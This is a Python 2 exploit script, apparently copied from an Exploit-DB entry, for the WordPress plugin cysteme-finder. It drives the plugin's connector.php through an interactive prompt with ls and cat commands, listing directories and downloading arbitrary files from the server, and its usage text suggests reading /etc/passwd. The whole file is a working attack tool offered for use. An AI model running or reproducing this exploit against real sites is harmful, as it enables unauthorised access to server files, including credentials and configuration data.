#!/usr/bin/evn python
# -*-:coding:utf-8 -*-
# Source: https://www.exploit-db.com/exploits/40295/

import httplib
from json import loads

def common(path):
    conn = httplib.HTTPConnection("127.0.0.1")
    conn.request("GET", "/wp-content/plugins/cysteme-finder/php/connector.php?wphome=" + path + "&cmd=open&init=1&tree=1")
    return loads(conn.getresponse().read())

def ls(path):
    try:
        data = common(path)["files"]
        print ""    #空一行。
        print "Total files: %d\n"  %len(data)
        for counter in range(len(data)):
	    if data[counter]["mime"]:
                print data[counter]["mime"] , ":" ,
	    else:
                print "Unknown type" , ":" ,
            print data[counter]["name"]
        print "\n"
    except KeyError:
        print "没有这个文件夹 / No such FOLDER\n"

def cat(raw_path):
    path = ""
    split_path = raw_path.split("/")
    filename = split_path[-1]
    for counter in range(len(split_path) - 1):
        path += "/"
        path += split_path[counter]
    try:
        data = common(path)["files"]
        print ""    #空一行。
        for counter in range(len(data)):
            if data[counter]["name"] == filename:
                hash = data[counter]["hash"]
                conn = httplib.HTTPConnection("127.0.0.1")  
                conn.request("GET", "/wp-content/plugins/cysteme-finder/php/connector.php?wphome=" + path + "&cmd=file&target=" + hash + "&download=1")  
                print conn.getresponse().read()
    except KeyError:
        print "没有这个文件夹 / No such FOLDER\n" 


print "用法示例：ls /etc , cat /etc/passwd。请使用绝对路径。键入“exit”退出。\ne.g.: ls /etc , cat /etc/passwd. Please use ABSOLUTE PATH. Type exit to leave. \n"
while True:
    raw_instruction = raw_input()
    instruction = raw_instruction.split()
    if instruction[0] == "exit":
        exit()
    if len(instruction) > 1:
        if instruction[0] == "ls":
            ls(instruction[1])
        elif instruction[0] == "cat":
            cat(instruction[1])
        else:
            print "未定义相关操作 / Undefined actions"
    else:
            print "缺少参数 / Missing Parameters"
